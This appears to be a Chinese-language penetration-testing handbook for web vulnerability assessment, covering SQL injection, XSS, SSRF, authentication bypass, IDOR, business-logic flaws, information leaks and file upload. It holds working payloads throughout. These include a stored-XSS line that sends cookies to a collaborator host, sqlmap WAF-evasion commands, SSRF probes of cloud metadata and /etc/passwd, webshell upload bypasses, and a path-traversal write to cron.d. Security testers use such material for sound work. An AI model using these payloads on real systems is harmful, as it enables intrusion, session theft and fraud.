# Web 漏洞评估手册（实战版）

本文档扩展 ctf-web/web-vulns.md 的内容，增加实战渗透特有的检测方法、WAF/IDS 规避和真实环境注意事项。
CTF 漏洞利用 payload 详细参考：[ctf-web/web-vulns.md](../ctf-web/web-vulns.md)

---

## SQL 注入检测

### 检测流程

1. **识别输入点**：GET/POST 参数、Cookie、HTTP 头（X-Forwarded-For、Referer、User-Agent）
2. **基础探测**：
   ```
   原始值: id=1
   测试1: id=1'          → 观察是否报错
   测试2: id=1' AND '1'='1   → 观察是否正常
   测试3: id=1' AND '1'='2   → 观察是否异常
   测试4: id=1 AND 1=1       → 数字型测试
   测试5: id=2-1             → 算术测试
   ```
3. **确认注入**：使用 time-based 做最终确认
   ```sql
   id=1' AND SLEEP(5)-- -    -- MySQL
   id=1'; WAITFOR DELAY '0:0:5'-- -  -- MSSQL
   id=1' AND pg_sleep(5)-- -  -- PostgreSQL
   ```

### 自动化检测

```bash
# sqlmap 基础检测
sqlmap -u "https://target.com/api?id=1" --batch --level=3 --risk=2

# 从 Burp 日志批量测试
sqlmap -l burp-log.txt --batch --level=3

# POST 参数
sqlmap -u "https://target.com/login" --data "user=admin&pass=test" --batch

# Cookie 注入
sqlmap -u "https://target.com/profile" --cookie "user_id=1" -p user_id --batch

# Header 注入
sqlmap -u "https://target.com/" --headers="X-Forwarded-For: 1*" --batch
```

### WAF 绕过策略

```bash
# sqlmap tamper 组合
sqlmap -u URL --tamper=space2comment,between,randomcase --random-agent --delay=2

# 手动绕过
# 1. 内联注释: /*!50000SELECT*/ /*!50000UNION*/
# 2. 换行: %0aSELECT
# 3. HPP: ?id=1&id=' UNION SELECT 1--（参数污染）
# 4. 分块传输: Transfer-Encoding: chunked
```

---

## XSS 检测

### 检测流程

1. **找反射点**：输入唯一标记（如 `xss_test_12345`），搜索响应中是否出现
2. **确定上下文**：
   - HTML 标签内容：`<div>REFLECTED</div>` → 尝试 `<script>alert(1)</script>`
   - HTML 属性中：`<input value="REFLECTED">` → 尝试 `" onfocus=alert(1) autofocus "`
   - JavaScript 中：`var x="REFLECTED"` → 尝试 `";alert(1)//`
   - URL 中：`<a href="REFLECTED">` → 尝试 `javascript:alert(1)`
3. **绕过过滤**：根据被过滤的字符选择绕过方法

### 存储型 XSS 检测

```
# 在所有持久化输入点注入：
# 用户名、个人简介、评论、文件名、反馈表单
# Payload:
<img src=x onerror=fetch('https://COLLABORATOR/?c='+document.cookie)>
```

### CORS 配置检测

```bash
# 测试 Origin 反射
curl -sI -H "Origin: https://evil.com" https://target.com/api | grep -i "access-control"

# 测试 null origin
curl -sI -H "Origin: null" https://target.com/api | grep -i "access-control"

# 危险配置：
# Access-Control-Allow-Origin: * （如果带 credentials）
# Access-Control-Allow-Origin: [反射任意 Origin]
# Access-Control-Allow-Credentials: true
```

---

## SSRF 检测

### 检测方法

```bash
# 1. 直接回连检测
# 在参数中传入自己控制的服务器地址
url=http://YOUR_SERVER/ssrf-test
# 检查服务器是否收到请求

# 2. 带外检测（OOB）
url=http://BURP_COLLABORATOR/ssrf

# 3. 内网探测
url=http://127.0.0.1:PORT
url=http://169.254.169.254/  # 云元数据

# 4. 协议探测
url=file:///etc/passwd
url=dict://127.0.0.1:6379/info
url=gopher://127.0.0.1:6379/_INFO
```

### 常见触发点

```
# URL 参数
?url=&redirect=&callback=&next=&link=&src=&image=&file=
?proxy=&load=&target=&fetch=&page=&content=&feed=

# 文件导入功能
# PDF 生成（wkhtmltopdf、puppeteer）
# 图片处理（ImageMagick）
# Webhook URL
# 富文本编辑器（加载远程图片）
```

---

## 认证与授权测试

### 认证绕过

```
# 1. 默认凭证测试
admin:admin / admin:password / admin:123456 / root:root / test:test

# 2. 密码重置漏洞
# - Host 头注入：Host: evil.com（重置链接指向攻击者）
# - 可预测的重置 Token
# - 密码重置 Token 不过期

# 3. 多因素认证绕过
# - 直接访问认证后页面
# - 修改响应（将 "mfa_required" 改为 false）
# - 暴力破解 OTP

# 4. JWT 安全
# - alg: none 攻击
# - 算法混淆（RS256 → HS256）
# - 弱密钥爆破
# 详见 ctf-web/crypto-web.md#jwt-攻击
```

### 授权缺陷（IDOR / 越权）

```bash
# 水平越权：修改 ID 参数访问其他用户数据
GET /api/users/1001 → 200 OK（自己的数据）
GET /api/users/1002 → 200 OK（他人的数据 = IDOR）

# 垂直越权：低权限用户访问管理功能
# 以普通用户 Session 请求管理 API
curl -b "session=USER_SESSION" https://target.com/admin/users

# 参数篡改
POST /api/profile {"role": "admin"}
POST /api/order {"price": 0.01}

# HTTP 方法篡改
# 某些框架仅对 GET/POST 做权限检查
PUT /admin/config  # 可能绕过
PATCH /admin/users/1
```

---

## 业务逻辑漏洞

```
# 竞争条件
# - 优惠券重复使用
# - 余额并发提取
# - 库存超卖
# 用并发请求测试：
for i in $(seq 1 20); do
    curl -s -X POST https://target.com/api/redeem -d "coupon=GIFT100" -b "session=xxx" &
done
wait

# 整数溢出/下溢
# - 负数金额转账
# - 数量设为 -1

# 流程跳过
# - 跳过支付步骤直接确认订单
# - 跳过验证步骤直接修改密码

# 批量操作滥用
# - 用户枚举（注册/登录/重置不同提示）
# - 邮件轰炸（重复触发通知）
```

---

## 信息泄露检查

```bash
# 响应头信息泄露
curl -sI https://target.com | grep -iE "server|x-powered|x-aspnet|x-debug"

# 错误信息泄露
curl -s "https://target.com/api/undefined" | head -50
curl -s "https://target.com/api?id='" | head -50

# 调试接口
/debug  /console  /trace  /phpinfo.php  /_profiler
/actuator/env  /actuator/heapdump  /swagger-ui.html

# .env / 配置文件
/.env  /config.php  /wp-config.php  /application.yml
/web.config  /appsettings.json  /.git/config

# 目录列表
# 检查目录是否开启索引
for dir in /uploads /backup /temp /logs /static; do
    resp=$(curl -s -o /dev/null -w "%{http_code}" "https://target.com$dir/")
    echo "$dir: HTTP $resp"
done

# HTTP 安全头缺失
# X-Frame-Options / X-Content-Type-Options / Content-Security-Policy
# Strict-Transport-Security / X-XSS-Protection
```

---

## 文件上传检测

### 测试策略

```
1. 上传正常文件确认功能正常
2. 尝试上传 WebShell：
   - 原始 .php/.jsp/.aspx 后缀
   - 双后缀：shell.php.jpg
   - 大小写：shell.pHp
   - 空字节截断：shell.php%00.jpg (旧版本)
   - 特殊后缀：.phtml .php3 .php5 .phar .shtml .jspx
   - 竞争条件上传
3. 测试 MIME 类型绕过（修改 Content-Type）
4. 测试文件头绕过（GIF89a + webshell）
5. 上传 .htaccess / .user.ini 修改解析规则
6. 上传 SVG（可能触发 XSS/SSRF）
7. 上传 XML（可能触发 XXE）
```

### 路径穿越上传

```
filename="../../../etc/cron.d/backdoor"
filename="....//....//shell.php"
```
